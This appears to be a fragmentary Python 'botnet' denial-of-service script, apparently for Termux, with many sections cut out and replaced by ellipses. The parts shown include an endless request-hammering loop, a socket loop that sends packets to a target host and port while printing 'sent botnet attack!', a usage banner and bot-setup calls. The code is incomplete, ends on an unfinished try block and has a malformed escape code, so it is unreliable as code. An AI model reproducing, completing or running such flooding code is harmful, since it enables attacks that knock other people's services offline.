"""
Copyright [2019] [Botnet attack GNU # TERMUX BY ZEUS666GHOST]
...
def bot_hammering(url):
	try:
		while True:
			...
			print("\033[94mBOT RE FRESHING...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)
	...
	try:
		while True:
			...
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[94m sent botnet attack! TO--> \033[0 \033[92m",host,"\033[0m")
			else:
				s.shutdown(1)
...
def usage():
	print (''' \033[92m	 botnet Script v.2
...
if __name__ == '__main__':
	...
	print("\033[94mMENYIAPKAN BOT...\033[0m")
	user_agent()
	my_bots()
	time.sleep(5)
	try:
